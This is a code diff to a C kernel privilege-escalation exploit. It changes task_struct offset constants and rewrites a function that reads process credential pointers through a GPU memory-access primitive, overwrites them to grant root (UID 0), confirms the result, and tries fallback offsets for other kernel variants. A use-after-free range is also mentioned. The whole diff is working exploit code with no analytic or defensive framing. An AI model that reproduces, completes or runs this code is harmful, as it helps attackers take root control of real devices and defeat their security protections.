@@ -30,7 +30,7 @@
 
 #define OFFSET_PID           0x548
 #define OFFSET_TGID          0x550
-#define OFFSET_COMM          0x718
+#define OFFSET_COMM          0x818
 #define OFFSET_REAL_CRED     0x768
 #define OFFSET_CRED          0x770
 #define OFFSET_TASKS         0x3f0
@@ -1354,19 +1354,39 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
 
     // 3. Patch specific process credentials (most reliable)
     if (cred_ptr != 0) {
-        fprintf(stderr, "[PARENT] Patching target process CRED pointers at task+0x848, 0x850, 0x870, 0x878...\n");
+        fprintf(stderr, "[PARENT] Patching target process CRED pointers at task+0x%lx, 0x%lx...\n", 
+                (unsigned long)OFFSET_REAL_CRED, (unsigned long)OFFSET_CRED);
         
-        // Read the actual pointers from task_struct to be sure
-        uint64_t c1, c2, c3, c4;
-        gpu_read_task_struct(fd, task_va + 0x848, (uint8_t *)&c1, 8);
-        gpu_read_task_struct(fd, task_va + 0x850, (uint8_t *)&c2, 8);
-        gpu_read_task_struct(fd, task_va + 0x870, (uint8_t *)&c3, 8);
-        gpu_read_task_struct(fd, task_va + 0x878, (uint8_t *)&c4, 8);
+        // Read the actual pointers from task_struct
+        uint64_t rc = 0, c = 0;
+        gpu_read_task_struct(fd, task_va + OFFSET_REAL_CRED, (uint8_t *)&rc, 8);
+        gpu_read_task_struct(fd, task_va + OFFSET_CRED, (uint8_t *)&c, 8);
         
-        if ((c1 >> 48) == 0xffff) patch_cred_via_gpu(fd, c1, 0);
-        if ((c2 >> 48) == 0xffff) patch_cred_via_gpu(fd, c2, 0);
-        if ((c3 >> 48) == 0xffff) patch_cred_via_gpu(fd, c3, 0);
-        if ((c4 >> 48) == 0xffff) patch_cred_via_gpu(fd, c4, 0);
+        fprintf(stderr, "[PARENT] real_cred: 0x%lx, cred: 0x%lx\n", (unsigned long)rc, (unsigned long)c);
+
+        if ((rc >> 48) == 0xffff) {
+            patch_cred_via_gpu(fd, rc, 0);
+        }
+        if ((c >> 48) == 0xffff) {
+            patch_cred_via_gpu(fd, c, 0);
+        }
+
+        // Verification of process patch
+        uint32_t verify_uid = 1;
+        if (c != 0 && gpu_read_task_struct(fd, c + 4, (uint8_t *)&verify_uid, 4) == 0) {
+            fprintf(stderr, "[PARENT] Target process UID verification: %u\n", verify_uid);
+            if (verify_uid == 0) {
+                fprintf(stderr, "[PARENT] [+++] TARGET PROCESS ROOT CONFIRMED!\n");
+            } else {
+                fprintf(stderr, "[PARENT] [!] TARGET PATCH FAILED. Trying fallback to task+0x848/0x850...\n");
+                // Fallback for different kernel variants
+                uint64_t c1, c2;
+                gpu_read_task_struct(fd, task_va + 0x848, (uint8_t *)&c1, 8);
+                gpu_read_task_struct(fd, task_va + 0x850, (uint8_t *)&c2, 8);
+                if ((c1 >> 48) == 0xffff) patch_cred_via_gpu(fd, c1, 0);
+                if ((c2 >> 48) == 0xffff) patch_cred_via_gpu(fd, c2, 0);
+            }
+        }
     }
 
     // 4. Mass Patch all CREDs matching our UID in UAF range (extra safety)
